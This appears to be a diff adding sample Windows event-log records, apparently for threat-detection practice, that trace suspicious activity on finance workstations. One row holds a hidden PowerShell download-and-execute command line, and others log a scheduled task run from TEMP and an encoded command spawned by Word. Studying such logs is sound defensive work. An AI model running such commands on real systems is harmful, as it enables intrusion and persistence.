@@ -1,0 +1,6 @@
+timestamp,host,user,event_id,process,message
+2026-10-02T09:14:01Z,fin-ws-07,a.ivanov,4688,powershell.exe,Process created with command line powershell -nop -w hidden -c IEX DownloadString
+2026-10-02T10:15:22Z,fin-ws-07,a.ivanov,4698,schtasks.exe,Scheduled task Updater created to run from TEMP
+2026-10-02T11:44:07Z,fin-ws-05,m.kozlova,4688,notepad.exe,Process created
+2026-10-02T12:31:18Z,fin-ws-03,d.orlov,4688,powershell.exe,Encoded command executed from winword.exe
+2026-10-02T13:40:55Z,core-dc-01,system,4688,schtasks.exe,Scheduled task Maintenance started
